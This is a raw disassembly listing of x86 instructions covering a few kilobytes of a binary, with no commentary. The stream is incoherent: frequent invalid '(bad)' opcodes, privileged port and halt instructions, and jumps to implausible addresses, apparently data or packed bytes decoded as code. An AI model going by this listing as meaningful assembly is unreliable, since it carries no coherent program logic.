  408994:	jl     0x4089cc
  408996:	outs   dx,DWORD PTR ds:[esi]
  408997:	push   esi
  408998:	add    DWORD PTR [edx],edi
  40899a:	es or  ebx,ecx
  40899d:	fsub   QWORD PTR [ebx+0x574de97]
  4089a3:	(bad)  
  4089a5:	pop    ss
  4089a6:	ret    0x4d6b
  4089a9:	push   eax
  4089aa:	fisttp WORD PTR [ebp+0x16]
  4089ad:	or     eax,0x40d5532d
  4089b2:	push   ebp
  4089b3:	or     eax,0x69d07edc
  4089b8:	fs xchg ebp,eax
  4089ba:	mov    ebx,0xb337cc86
  4089bf:	test   BYTE PTR [ebp+0x63],bh
  4089c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089c3:	cmc    
  4089c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089c5:	es adc edx,ebx
  4089c8:	xor    cl,BYTE PTR [ebx-0x1ea7fc81]
  4089ce:	pop    ecx
  4089cf:	add    al,0x42
  4089d1:	shl    DWORD PTR [edi],1
  4089d3:	popf   
  4089d4:	mov    eax,0x7675475d
  4089d9:	pop    esp
  4089da:	adc    DWORD PTR [ebx+0x23b29fb3],eax
  4089e0:	jo     0x4089d6
  4089e2:	xchg   esi,eax
  4089e3:	sbb    eax,DWORD PTR [ebp+0x66]
  4089e6:	(bad)  
  4089e7:	push   edi
  4089e8:	std    
  4089e9:	xor    eax,0x7f2d6c27
  4089ee:	inc    eax
  4089ef:	cmovg  esp,DWORD PTR [ebp-0x57e6313d]
  4089f6:	fbld   TBYTE PTR [ecx-0x54]
  4089f9:	mov    ?,WORD PTR [edx+eax*1+0x31]
  4089fd:	xor    ecx,ebx
  4089ff:	adc    bl,BYTE PTR [ecx-0x5e58b6e6]
  408a05:	nop
  408a06:	gs mov ch,0x63
  408a09:	inc    ebx
  408a0a:	lock stc 
  408a0c:	ret    
  408a0d:	mov    BYTE PTR ss:[edi-0x777d80d],dl
  408a14:	(bad)  
  408a15:	xchg   ebx,eax
  408a16:	out    0xa3,eax
  408a18:	xchg   esi,eax
  408a19:	pop    ds
  408a1a:	cdq    
  408a1b:	pop    ecx
  408a1c:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a1e:	push   cs
  408a1f:	pop    esp
  408a20:	(bad)  
  408a22:	lahf   
  408a23:	jns    0x408a59
  408a25:	mov    DWORD PTR [edi-0x4],0xd13121ec
  408a2c:	push   ds
  408a2d:	out    dx,eax
  408a2e:	jmp    0xf326bc6a
  408a33:	dec    esi
  408a34:	cmc    
  408a35:	push   0xffffffc3
  408a37:	mov    eax,0xce5cca14
  408a3c:	in     al,dx
  408a3d:	sub    cl,BYTE PTR [ebp+0xe]
  408a40:	push   edi
  408a41:	fs pushf 
  408a43:	lods   eax,DWORD PTR ds:[esi]
  408a44:	les    eax,FWORD PTR [edi-0x49dd59c7]
  408a4a:	sti    
  408a4b:	cmp    DWORD PTR [esi],esp
  408a4d:	das    
  408a4e:	and    DWORD PTR [ebx+0x4c],edi
  408a51:	push   ecx
  408a52:	sbb    DWORD PTR ds:0x8d5b0ca1,edx
  408a58:	adc    al,0xa0
  408a5a:	test   al,0x52
  408a5c:	adc    al,0xb7
  408a5e:	push   cs
  408a5f:	jp     0x4089ea
  408a61:	add    cl,BYTE PTR [ebp+0x12]
  408a64:	xchg   DWORD PTR [edi+ebp*1-0x73],edi
  408a68:	mov    eax,ds:0x3fd49b67
  408a6d:	enter  0x5694,0xa7
  408a71:	mov    esi,0xcaf989b3
  408a76:	(bad)  
  408a77:	addr16 push esp
  408a79:	jno    0x408af7
  408a7b:	lea    ecx,[ebx]
  408a7d:	sub    eax,0x786a1740
  408a82:	mov    cl,0x48
  408a84:	xbegin 0x5b7e5f0f
  408a8a:	in     al,0x0
  408a8c:	jge    0x408aa1
  408a8e:	inc    ebp
  408a8f:	xor    ebx,DWORD PTR [eax+0x215f452d]
  408a95:	loop   0x408a29
  408a97:	sbb    edi,DWORD PTR [ebx-0x13bcc877]
  408a9d:	and    bl,BYTE PTR [ebx]
  408a9f:	sub    DWORD PTR [ebp+edi*1-0x74],esi
  408aa3:	js     0x408ad1
  408aa5:	sbb    bl,0x5f
  408aa8:	sub    BYTE PTR [ebx-0x3f8e5b56],bl
  408aae:	retf   0x95bb
  408ab1:	or     dl,ah
  408ab3:	aam    0xf
  408ab5:	jno    0x408a87
  408ab7:	or     al,0xd4
  408ab9:	lods   eax,DWORD PTR ds:[esi]
  408aba:	pusha  
  408abb:	add    bh,BYTE PTR [esi-0x975da62]
  408ac1:	ficom  WORD PTR [eax]
  408ac3:	ret    0xe664
  408ac6:	mov    eax,ds:0xbeb45c1a
  408acb:	hlt    
  408acc:	add    DWORD PTR [ebx],esp
  408ace:	div    BYTE PTR [edx-0x1222ea66]
  408ad4:	mov    esp,0xa4acde9b
  408ad9:	jecxz  0x408a83
  408adb:	xor    BYTE PTR [ebx-0x5cb75ea8],0xef
  408ae2:	push   cs
  408ae3:	push   ebp
  408ae4:	subps  xmm4,XMMWORD PTR [ecx+esi*2-0x3d5d93d5]
  408aec:	or     BYTE PTR [edi-0x324af661],bh
  408af2:	cdq    
  408af3:	adc    ecx,DWORD PTR [edi+0x10]
  408af6:	and    ah,al
  408af8:	mov    dh,0xe1
  408afa:	mov    al,0x1b
  408afc:	fist   WORD PTR [eax-0x2f3292b8]
  408b02:	int3   
  408b03:	int3   
  408b04:	push   eax
  408b05:	es jmp 0x408b06
  408b08:	adc    eax,0x8ea7d9db
  408b0d:	adc    edx,DWORD PTR [edi-0x32d9821a]
  408b13:	cmp    DWORD PTR [esi+eiz*8+0x26],edi
  408b17:	cmp    edx,esi
  408b19:	fisubr WORD PTR ds:0x88688356
  408b1f:	into   
  408b20:	ins    DWORD PTR es:[edi],dx
  408b21:	das    
  408b22:	mov    bh,0x18
  408b24:	sar    esi,cl
  408b26:	add    dh,BYTE PTR ss:[esi]
  408b29:	xchg   esp,eax
  408b2a:	out    dx,al
  408b2b:	outs   dx,BYTE PTR ds:[esi]
  408b2c:	jo     0x408b12
  408b2e:	dec    ecx
  408b2f:	mov    ds:0xe73b1deb,eax
  408b34:	mov    ds:0x4e3c3aa5,al
  408b39:	pop    ds
  408b3a:	jnp    0x408acd
  408b3c:	lea    edx,[esi-0x23]
  408b3f:	dec    esp
  408b40:	cmp    ebp,DWORD PTR [ebp+edi*8-0x7c5d1796]
  408b47:	test   al,0xc1
  408b49:	cmp    eax,0x7df4a64
  408b4e:	js     0x408bac
  408b50:	hlt    
  408b51:	adc    al,0xe0
  408b53:	lock mov ah,0x4
  408b56:	call   0xdcc8d884
  408b5b:	inc    esi
  408b5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b5d:	inc    ecx
  408b5e:	jmp    0x2de31563
  408b63:	add    eax,0x2249133
  408b68:	cmp    edi,0xffffffb6
  408b6b:	mov    ebx,0x584f3f73
  408b70:	(bad)  
  408b71:	push   0x839e51e3
  408b76:	cdq    
  408b77:	jg     0x408b2b
  408b79:	dec    ecx
  408b7a:	dec    edi
  408b7b:	or     dh,BYTE PTR [ecx-0x20]
  408b7e:	xor    edx,DWORD PTR fs:[esi-0x2796cc1]
  408b85:	xor    DWORD PTR [ecx-0x304c07f],esp
  408b8b:	add    cl,0x5a
  408b8e:	bound  ecx,QWORD PTR [ebx+0x70]
  408b91:	popa   
  408b92:	lea    eax,[eax+ecx*4]
  408b95:	dec    esi
  408b96:	cmp    edx,ebx
  408b98:	dec    ecx
  408b99:	bound  ecx,QWORD PTR [eax+ebp*2]
  408b9c:	mov    eax,0x14722b5a
  408ba1:	scas   eax,DWORD PTR es:[edi]
  408ba2:	(bad)  [ebx+0x62]
  408ba5:	mul    BYTE PTR [edi]
  408ba7:	dec    ebp
  408ba8:	int3   
  408ba9:	pusha  
  408baa:	fistp  WORD PTR [edi-0x45]
  408bad:	arpl   WORD PTR [edx-0x43],bp
  408bb0:	or     cl,BYTE PTR [ebx]
  408bb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bb3:	push   cs
  408bb4:	test   BYTE PTR [eax-0x1f6fe2a1],cl
  408bba:	idiv   DWORD PTR [esi]
  408bbc:	pop    ebp
  408bbd:	iret   
  408bbe:	(bad)  
  408bbf:	mov    BYTE PTR [esi],dh
  408bc1:	mov    ebp,0xcc80795a
  408bc6:	addr16 sahf 
  408bc8:	ret    
  408bc9:	jmp    0xc618:0x5416277f
  408bd0:	int3   
  408bd1:	push   cs
  408bd2:	sar    DWORD PTR [edi+0x2d],cl
  408bd5:	int    0xcc
  408bd7:	and    DWORD PTR [ebp+0x4b],0x62
  408bdb:	jge    0x408c0e
  408bdd:	sti    
  408bde:	loope  0x408b8a
  408be0:	retf   
  408be1:	mov    esp,0xd2eabd43
  408be6:	sbb    ecx,0xffffffee
  408be9:	dec    edi
  408bea:	sbb    al,BYTE PTR [ecx+eiz*1-0x39205cea]
  408bf1:	imul   DWORD PTR [esi-0x2650c57c]
  408bf7:	inc    ecx
  408bf8:	aas    
  408bf9:	mov    ds:0x7a7ba29f,al
  408bfe:	ja     0x408c12
  408c00:	cmp    BYTE PTR [ebp+0x38],0x61
  408c04:	shl    DWORD PTR [edi+eiz*8+0x5be1e080],0x90
  408c0c:	push   es
  408c0d:	das    
  408c0e:	popa   
  408c0f:	xlat   BYTE PTR ds:[ebx]
  408c10:	(bad)  
  408c11:	stc    
  408c12:	inc    eax
  408c13:	int    0xb8
  408c15:	rcl    dh,cl
  408c17:	sub    ebx,DWORD PTR [edx+0x54d3d23a]
  408c1d:	adc    DWORD PTR [ecx+0x3a],esi
  408c20:	test   BYTE PTR [eax+eax*1],dl
  408c23:	push   edi
  408c24:	mov    DWORD PTR ds:0xf0e76578,ebp
  408c2a:	stc    
  408c2b:	or     BYTE PTR [ebx],al
  408c2d:	sbb    bh,BYTE PTR [ebx+0x0]
  408c30:	data16 test cl,dl
  408c33:	pop    ds
  408c34:	adc    al,0x8a
  408c36:	cmp    al,0x27
  408c38:	mov    ebp,0xd10ec79c
  408c3d:	add    al,0x57
  408c3f:	pop    esi
  408c40:	pop    ecx
  408c41:	inc    esi
  408c42:	mov    eax,ds:0xfd995882
  408c47:	dec    ecx
  408c48:	xchg   ecx,eax
  408c49:	cmp    BYTE PTR [ebx],al
  408c4b:	lea    edx,[edi-0xd]
  408c4e:	and    eax,0x923b7be9
  408c53:	outs   dx,BYTE PTR ds:[esi]
  408c54:	pmuludq mm6,mm6
  408c57:	sub    al,bh
  408c59:	jno    0x408c7c
  408c5b:	hlt    
  408c5c:	cmp    al,0x72
  408c5e:	xchg   esp,eax
  408c5f:	daa    
  408c60:	dec    edi
  408c61:	lahf   
  408c62:	fucomp st(1)
  408c64:	popa   
  408c65:	(bad)  
  408c67:	push   edx
  408c68:	push   0xffffffbe
  408c6a:	sub    al,0x22
  408c6c:	repz jbe 0x408cbf
  408c6f:	jae    0x408c25
  408c71:	jae    0x408c09
  408c73:	mov    cl,0xdc
  408c75:	jns    0x408c11
  408c77:	inc    esp
  408c78:	push   eax
  408c79:	add    eax,0x7452997a
  408c7e:	or     eax,0x6d8a76a7
  408c83:	mov    ebx,0x5d6b05c2
  408c88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c89:	add    DWORD PTR [esi-0x5b],0xffffffe2
  408c8d:	xor    ebx,DWORD PTR [esi+0x2fc71ef4]
  408c93:	adc    eax,0x79e235f2
  408c98:	fwait
  408c99:	ss jne 0x408cb7
  408c9c:	xchg   esp,eax
  408c9d:	jmp    0x408c4c
  408c9f:	pop    ss
  408ca0:	or     bh,BYTE PTR [edi]
  408ca2:	scas   eax,DWORD PTR es:[edi]
  408ca3:	les    ebp,FWORD PTR [ecx+0x38167a7e]
  408ca9:	imul   ebx,DWORD PTR [esi-0x1c],0x8a7b082d
  408cb0:	add    edi,DWORD PTR [edi-0x593b9fc0]
  408cb6:	call   0x63973b56
  408cbb:	adc    dl,BYTE PTR [edi-0x6e6fee23]
  408cc1:	cmp    al,0xa2
  408cc3:	(bad)  
  408cc4:	(bad)  
  408cc5:	test   eax,0x6936548f
  408cca:	mov    WORD PTR [ecx+0x3fae7612],ds
  408cd0:	add    ah,BYTE PTR [eax]
  408cd2:	in     eax,dx
  408cd3:	ret    
  408cd4:	pop    edx
  408cd5:	(bad)  
  408cd6:	or     eax,0x22a025cf
  408cdb:	(bad)  
  408cdc:	and    BYTE PTR [esi-0x5fdbe5ae],al
  408ce2:	(bad)  [ecx+ecx*4-0x65e721bb]
  408ce9:	or     ebx,ecx
  408ceb:	inc    edi
  408cec:	(bad)  
  408ced:	hlt    
  408cee:	call   0xd363:0x4abfb591
  408cf5:	xchg   ebp,eax
  408cf6:	dec    esi
  408cf7:	dec    ebx
  408cf8:	es scas eax,DWORD PTR es:[edi]
  408cfa:	push   ds
  408cfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cfc:	add    edi,edx
  408cfe:	aam    0xce
  408d00:	ret    0xb123
  408d03:	aas    
  408d04:	(bad)  
  408d05:	add    al,al
  408d07:	stos   DWORD PTR es:[edi],eax
  408d08:	stos   BYTE PTR es:[edi],al
  408d09:	(bad)  
  408d0a:	adc    al,0x2f
  408d0c:	xchg   esp,eax
  408d0d:	jmp    0x408c93
  408d0f:	xor    DWORD PTR [edx+0x59],edx
  408d12:	loopne 0x408cfe
  408d14:	les    edx,FWORD PTR [ecx-0x5d3d2399]
  408d1a:	fimul  DWORD PTR [ebx-0x76]
  408d1d:	push   cs
  408d1e:	xor    eax,edx
  408d20:	cmp    bh,BYTE PTR [ecx-0x466fe6ce]
  408d26:	jecxz  0x408d12
  408d28:	add    eax,0xb7f34713
  408d2d:	pop    eax
  408d2e:	ror    BYTE PTR [ebp+edi*4-0x35fd968e],0x8c
  408d36:	pop    ebx
  408d37:	adc    al,0x80
  408d39:	add    edi,DWORD PTR [eax+0x1bf948c3]
  408d3f:	lahf   
  408d40:	inc    esi
  408d41:	inc    edx
  408d42:	push   eax
  408d43:	cs cmp esi,ecx
  408d46:	ret    0xf244
  408d49:	dec    edx
  408d4a:	cs xchg esp,eax
  408d4c:	sbb    al,0xeb
  408d4e:	pop    ebp
  408d4f:	ss loop 0x408cec
  408d52:	hlt    
  408d53:	add    eax,0xf4669287
  408d58:	add    DWORD PTR [eax-0x3c77b9bf],edx
  408d5e:	repnz cmp BYTE PTR [eax+ebx*1+0x462e397b],ch
  408d66:	and    al,0xa
  408d68:	rol    edi,1
  408d6a:	sbb    eax,0x9ee6b5e2
  408d6f:	xor    edi,edi
  408d71:	mov    dh,0x49
  408d73:	jae    0x408d42
  408d75:	mov    esp,0x46df6ccb
  408d7a:	adc    eax,ebx
  408d7c:	lods   eax,DWORD PTR ds:[esi]
  408d7d:	sti    
  408d7e:	mov    WORD PTR ds:0x63addd3c,cs
  408d84:	push   ebx
  408d85:	pop    ebp
  408d86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d87:	xor    bl,BYTE PTR [edi+edi*8]
  408d8a:	rol    BYTE PTR [ecx],cl
  408d8c:	in     al,0x88
  408d8e:	pop    ecx
  408d8f:	mov    dl,0xdd
  408d91:	pop    eax
  408d92:	cmp    DWORD PTR [esi+eax*8-0x1d],ebx
  408d96:	clc    
  408d97:	add    al,0x2
  408d99:	sub    BYTE PTR [ecx+0x29],al
  408d9c:	adc    BYTE PTR [eax],dl
  408d9e:	into   
  408d9f:	adc    BYTE PTR [ebx+0x2d55aaf2],0x2c
  408da6:	mov    edx,0x7232a6b0
  408dab:	shl    DWORD PTR [edx+0xe],1
  408dae:	sbb    al,0x6c
  408db0:	or     ah,BYTE PTR [edx-0x5a]
  408db3:	in     eax,dx
  408db4:	cs in  al,0xd6
  408db7:	mov    ah,0xba
  408db9:	xor    DWORD PTR [eax-0x34],0x61
  408dbd:	adc    esi,DWORD PTR [eax+0x5e]
  408dc0:	je     0x408da7
  408dc2:	gs push ss
  408dc4:	fwait
  408dc5:	cmp    edx,eax
  408dc7:	inc    eax
  408dc8:	inc    esi
  408dc9:	cdq    
  408dca:	aas    
  408dcb:	dec    ebx
  408dcc:	mov    DWORD PTR [ebx+0x40],ebp
  408dcf:	push   eax
  408dd0:	fcmovbe st,st(4)
  408dd2:	enter  0x74d2,0x26
  408dd6:	xchg   edi,eax
  408dd7:	push   esp
  408dd8:	fs mov bl,0xde
  408ddb:	jecxz  0x408d82
  408ddd:	retf   0x3491
  408de0:	fsubp  st(4),st
  408de2:	and    DWORD PTR [ecx],edx
  408de4:	(bad)
  408de8:	xchg   DWORD PTR [esi-0x1af4b48d],edx
  408dee:	push   cs
  408def:	mov    DWORD PTR [ebp+0x5e1d5650],ebp
  408df5:	dec    esi
  408df6:	push   edx
  408df7:	push   cs
  408df8:	jl     0x408dd6
  408dfa:	repnz mov dl,0xfe
  408dfd:	jmp    0xf8026db8
  408e02:	cld    
  408e03:	cwde   
  408e04:	jbe    0x408e35
  408e06:	sbb    BYTE PTR [esi+0x5],dl
  408e09:	clc    
  408e0a:	les    ecx,FWORD PTR [esi-0x5c6daac6]
  408e10:	sahf   
  408e11:	ret    0x759b
  408e14:	mov    edi,0xb391c883
  408e19:	xchg   esp,eax
  408e1a:	wbinvd 
  408e1c:	clc    
  408e1d:	(bad)  
  408e1e:	or     ah,BYTE PTR [esi-0x1d]
  408e21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e22:	inc    ebp
  408e23:	push   edx
  408e24:	out    0x4f,al
  408e26:	jne    0x408e08
  408e28:	push   ebp
  408e29:	arpl   WORD PTR ds:0x9f8cc503,cx
  408e2f:	xchg   esp,eax
  408e30:	pop    ecx
  408e31:	mov    ebx,0x63465a75
  408e36:	jmp    0x408dd1
  408e38:	inc    esp
  408e39:	shl    BYTE PTR [edx+0x2e288944],cl
  408e3f:	dec    edi
  408e40:	mov    esi,0xa61c2a4
  408e45:	retf   
  408e46:	dec    eax
  408e47:	pop    ds
  408e48:	outs   dx,DWORD PTR ds:[esi]
  408e49:	xchg   DWORD PTR [edx+0x59a4067d],ebp
  408e4f:	add    al,0x4c
  408e51:	cdq    
  408e52:	aad    0x32
  408e54:	cmp    ecx,edi
  408e56:	sub    DWORD PTR gs:[si-0x5b7d],edi
  408e5c:	outs   dx,BYTE PTR ds:[esi]
  408e5d:	mov    edx,DWORD PTR [esi]
  408e5f:	or     eax,0x78e39c52
  408e64:	mov    al,0x51
  408e66:	xchg   ecx,eax
  408e67:	fistp  WORD PTR [ebp-0x70210ae5]
  408e6d:	pop    esp
  408e6e:	ins    DWORD PTR es:[edi],dx
  408e6f:	or     al,BYTE PTR [ebp-0x62]
  408e72:	xchg   BYTE PTR [edx-0x7f2044a],cl
  408e78:	pop    eax
  408e79:	fadd   DWORD PTR [eax-0x3e346f54]
  408e7f:	mov    bh,0xea
  408e81:	xchg   ebx,eax
  408e82:	xchg   esi,eax
  408e83:	xor    al,al
  408e85:	daa    
  408e86:	jns    0x408ea2
  408e88:	push   edi
  408e89:	sbb    dh,BYTE PTR [esi+0x3b]
  408e8c:	jae    0x408edd
  408e8e:	cli    
  408e8f:	or     BYTE PTR [ebx+0x2c],bh
  408e92:	(bad)  
  408e94:	neg    BYTE PTR [edx]
  408e96:	stos   DWORD PTR es:[edi],eax
  408e97:	mov    ds:0x94a60089,eax
  408e9c:	and    DWORD PTR [ecx-0x57f86a6d],ecx
  408ea2:	arpl   WORD PTR [ebx-0x5b],sp
  408ea5:	ficomp DWORD PTR [ecx+esi*2-0x74a0f8ab]
  408eac:	push   edx
  408ead:	outs   dx,BYTE PTR ds:[esi]
  408eae:	adc    al,0x57
  408eb0:	push   cs
  408eb1:	jno    0x408eef
  408eb3:	inc    ebp
  408eb4:	fucomp st(0)
  408eb6:	pop    eax
  408eb7:	xchg   esi,eax
  408eb8:	fucomi st,st(3)
  408eba:	jb     0x408e68
  408ebc:	pop    edi
  408ebd:	lods   eax,DWORD PTR ds:[esi]
  408ebe:	xchg   BYTE PTR [esi-0x54a9046a],bh
  408ec4:	jae    0x408ed0
  408ec6:	in     al,0x36
  408ec8:	ficomp DWORD PTR [ebp-0x6efe0a6a]
  408ece:	jge    0x408ead
  408ed0:	pop    ecx
  408ed1:	dec    ebx
  408ed2:	iret   
  408ed3:	lods   eax,DWORD PTR ds:[esi]
  408ed4:	aas    
  408ed5:	mov    ds:0x5ffcee55,al
  408eda:	xchg   edi,eax
  408edb:	dec    edx
  408edc:	pop    ebp
  408edd:	out    0x50,eax
  408edf:	pop    esi
  408ee0:	or     eax,0x43825e9a
  408ee5:	test   al,0x71
  408ee7:	push   edx
  408ee8:	out    dx,al
  408ee9:	pop    ecx
  408eea:	ret    0xb1ad
  408eed:	or     BYTE PTR [edi-0x48],al
  408ef0:	pop    ebx
  408ef1:	lods   al,BYTE PTR ds:[esi]
  408ef2:	lahf   
  408ef3:	dec    edx
  408ef4:	xor    al,0xea
  408ef6:	dec    esp
  408ef7:	loop   0x408f51
  408ef9:	iret   
  408efa:	push   ss
  408efb:	mov    ebp,0x4335cca2
  408f00:	mov    ebp,0xc9b5c0bc
  408f05:	test   BYTE PTR [edx],dh
  408f07:	push   0xffffff9d
  408f09:	or     BYTE PTR [ecx-0x1734fb2f],ch
  408f0f:	popf   
  408f10:	dec    ebp
  408f11:	xor    edi,DWORD PTR [edi-0x50]
  408f14:	cmp    al,BYTE PTR [edx+0x5fe7fd8d]
  408f1a:	push   0x63bb8fd3
  408f1f:	outs   dx,DWORD PTR ds:[esi]
  408f20:	mov    edx,edi
  408f22:	test   al,0x99
  408f24:	mov    esi,0x7730a3bd
  408f29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f2a:	xor    DWORD PTR [ebp-0x3ece127d],eax
  408f30:	gs clc 
  408f32:	jbe    0x408ec5
  408f34:	adc    BYTE PTR [esp+edx*2-0x58a8bc5b],cl
  408f3b:	mov    ecx,0x3d014153
  408f40:	pop    es
  408f41:	inc    edx
  408f42:	add    al,0x76
  408f44:	mov    ebx,edx
  408f46:	or     eax,0x19333d48
  408f4b:	pop    ebx
  408f4c:	jecxz  0x408faa
  408f4e:	push   edx
  408f4f:	sub    ecx,DWORD PTR [esi-0x4]
  408f52:	aas    
  408f53:	repnz call 0xd58:0x9f20fb09
  408f5b:	dec    edi
  408f5c:	ins    DWORD PTR es:[edi],dx
  408f5d:	mov    ebp,0x273dc706
  408f62:	jbe    0x408fbb
  408f64:	sub    ah,BYTE PTR [ebp+0x6c]
  408f67:	fnsave [eax-0x55]
  408f6a:	mov    edi,ebp
  408f6c:	imul   ecx,DWORD PTR [edx+ecx*8],0x18
  408f70:	lds    ebx,FWORD PTR [esi+0x4495355e]
  408f76:	pop    ebx
  408f77:	jge    0x408fac
  408f79:	add    al,0xc4
  408f7b:	fstp   TBYTE PTR [ebp+0x64]
  408f7e:	into   
  408f7f:	adc    ah,BYTE PTR gs:[eax]
  408f82:	cmp    bl,dl
  408f84:	std    
  408f85:	inc    edi
  408f86:	ret    0x346a
  408f89:	push   0xecedd57c
  408f8e:	cs push ecx
  408f90:	mov    dh,0x87
  408f92:	push   ecx
  408f93:	iret   
  408f94:	retf   
  408f95:	mov    DWORD PTR [ecx-0x59],ebp
  408f98:	add    dh,BYTE PTR [edi+0x1108ca37]
  408f9e:	push   esi
  408f9f:	cmp    DWORD PTR [esi],esp
  408fa1:	pop    esi
  408fa2:	popa   
  408fa3:	dec    esp
  408fa4:	scas   eax,DWORD PTR es:[edi]
  408fa5:	sbb    BYTE PTR [esi-0x59],0xba
  408fa9:	xor    BYTE PTR [ecx+0x638579ba],0xde
  408fb0:	lods   eax,DWORD PTR ds:[esi]
  408fb1:	xchg   ebp,eax
  408fb2:	ret    
  408fb3:	xchg   ecx,eax
  408fb4:	push   edx
  408fb5:	cmp    ecx,edi
  408fb7:	aam    0x4e
  408fb9:	or     ebx,DWORD PTR [ebx+0x76]
  408fbc:	fcmovu st,st(6)
  408fbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fbf:	fwait
  408fc0:	stos   BYTE PTR es:[edi],al
  408fc1:	jns    0x40903a
  408fc3:	stc    
  408fc4:	cmp    eax,0x1f5c1329
  408fc9:	mov    DWORD PTR [edx-0x1b],eax
  408fcc:	imul   ebp,edx,0xffffff8b
  408fcf:	xor    al,0xb4
  408fd1:	ds jb  0x408fc5
  408fd4:	dec    ecx
  408fd5:	gs xchg ecx,edi
  408fd8:	adc    dh,bl
  408fda:	adc    dl,bh
  408fdc:	aas    
  408fdd:	lea    ebp,[ebx-0x4a]
  408fe0:	test   BYTE PTR [ecx],ch
  408fe2:	or     ecx,esi
  408fe4:	cli    
  408fe5:	pusha  
  408fe6:	inc    eax
  408fe7:	ja     0x408f9f
  408fe9:	push   ebx
  408fea:	xchg   edi,eax
  408feb:	int3   
  408fec:	clc    
  408fed:	out    0x15,al
  408fef:	mov    esp,0x8792905f
  408ff4:	xor    dh,BYTE PTR [eax-0x4f]
  408ff7:	ror    BYTE PTR [ebp-0x4ae93a52],0x84
  408ffe:	and    DWORD PTR [ebp-0x37],edx
  409001:	bound  esp,QWORD PTR [esi-0x27e31211]
  409007:	pop    eax
  409008:	xchg   DWORD PTR [ebx+0x3d],esp
  40900b:	test   DWORD PTR [ebp-0x20a41d79],edx
  409011:	jl     0x40900c
  409013:	fnsave [ecx+0x11]
  409016:	cs push 0xffffff95
  409019:	punpcklwd mm3,DWORD PTR [ebp-0x1dd8b3a1]
  409020:	sub    DWORD PTR [ebp-0x1],esp
  409023:	(bad)  
  409024:	clc    
  409025:	jne    0x408fff
  409027:	fucomi st,st(6)
  409029:	pop    ebp
  40902a:	sar    dh,0x22
  40902d:	pushf  
  40902e:	(bad)  
  409030:	adc    DWORD PTR [edx+0x2733057c],esi
  409036:	(bad)  
  409037:	and    ch,BYTE PTR [edx]
  409039:	xchg   ebp,eax
  40903a:	in     eax,0x76
  40903c:	jno    0x4090af
  40903e:	xchg   esp,eax
  40903f:	mov    dl,0x80
  409041:	sbb    eax,0x410063ea
  409046:	mov    ecx,0x9014f13f
  40904b:	in     al,dx
  40904c:	popf   
  40904d:	loopne 0x408fe9
  40904f:	sub    cl,ah
  409051:	jmp    0x87592b51
  409056:	adc    bh,al
  409058:	lods   al,BYTE PTR ds:[esi]
  409059:	jnp    0x40905d
  40905b:	jmp    0x409033
  40905d:	inc    edx
  40905e:	cli    
  40905f:	dec    eax
  409060:	(bad)  
  409061:	ds xor al,0xa0
  409064:	ds inc esp
  409066:	pop    es
  409067:	push   ss
  409068:	xlat   BYTE PTR ds:[ebx]
  409069:	jno    0x40900b
  40906b:	call   0x1761:0x8b6af378
  409072:	or     esi,eax
  409074:	xchg   esp,eax
  409075:	out    0x14,al
  409077:	adc    ebx,DWORD PTR [ebp-0x70c880bf]
  40907d:	shr    BYTE PTR [ecx+esi*1-0x1124b5c1],1
  409084:	leave  
  409085:	ret    
  409086:	adc    BYTE PTR [edx],cl
  409088:	xrelease mov BYTE PTR [ecx+0x5e],al
  40908c:	dec    esi
  40908d:	pop    edx
  40908e:	std    
  40908f:	cmc    
  409090:	loop   0x409086
  409092:	mov    al,ds:0x96ce97aa
  409097:	adc    DWORD PTR ds:0xd8ee8f5c,0x49
  40909e:	push   edi
  40909f:	push   ds
  4090a0:	pop    ebp
  4090a1:	jge    0x40904a
  4090a3:	cmp    al,0xf8
  4090a5:	mov    al,0xfe
  4090a7:	pop    esi
  4090a8:	cmp    DWORD PTR ds:0xb65c40dc,edx
  4090ae:	ficom  DWORD PTR [esi+ecx*4]
  4090b1:	mov    ebp,0x85e044ef
  4090b6:	sbb    ebx,edx
  4090b8:	fcomp  QWORD PTR [ecx+0x1891108a]
  4090be:	and    bh,BYTE PTR [edx-0xc]
  4090c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090c2:	lods   eax,DWORD PTR ds:[esi]
  4090c3:	or     al,0x6c
  4090c5:	ret    
  4090c6:	dec    esi
  4090c7:	stos   DWORD PTR es:[edi],eax
  4090c8:	add    al,0x68
  4090ca:	jecxz  0x40911c
  4090cc:	inc    eax
  4090cd:	das    
  4090ce:	popa   
  4090cf:	sub    bl,BYTE PTR [eax-0x249bd5b]
  4090d5:	adc    ecx,ebx
  4090d7:	jle    0x4090a7
  4090d9:	jge    0x40911d
  4090db:	or     eax,0xa1331fe4
  4090e0:	cmp    BYTE PTR [edi],cl
  4090e2:	imul   ebx,DWORD PTR [edi+0x78311c9e],0xffffffb7
  4090e9:	test   cl,dh
  4090eb:	daa    
  4090ec:	xor    al,al
  4090ee:	sti    
  4090ef:	shl    BYTE PTR [eax+0x42],cl
  4090f2:	sbb    BYTE PTR [edi],bl
  4090f4:	fsubr  DWORD PTR [eax]
  4090f6:	jae    0x409102
  4090f8:	icebp  
  4090f9:	addr16 push ebp
  4090fb:	out    dx,eax
  4090fc:	mov    ds:0x2cdfdfb,al
  409101:	es jne 0x409099
  409104:	ret    
  409105:	lods   al,BYTE PTR ds:[esi]
  409106:	orps   xmm2,xmm4
  409109:	push   ds
  40910a:	in     al,dx
  40910b:	fild   DWORD PTR [esp+eax*4]
  40910e:	int    0xfd
  409110:	add    BYTE PTR [ecx-0x55],al
  409113:	mov    ds:0x71880ef5,eax
  409118:	mov    ds:0x852663cb,al
  40911d:	mov    eax,0x33d4aceb
  409122:	jnp    0x4090f2
  409124:	fmul   QWORD PTR [edx-0x14]
  409127:	dec    eax
  409128:	lock add dl,BYTE PTR [esi]
  40912b:	pop    ecx
  40912c:	mov    esp,0x7b99697e
  409131:	jge    0x4090c7
  409133:	jbe    0x4091b2
  409135:	mov    bh,0x44
  409137:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
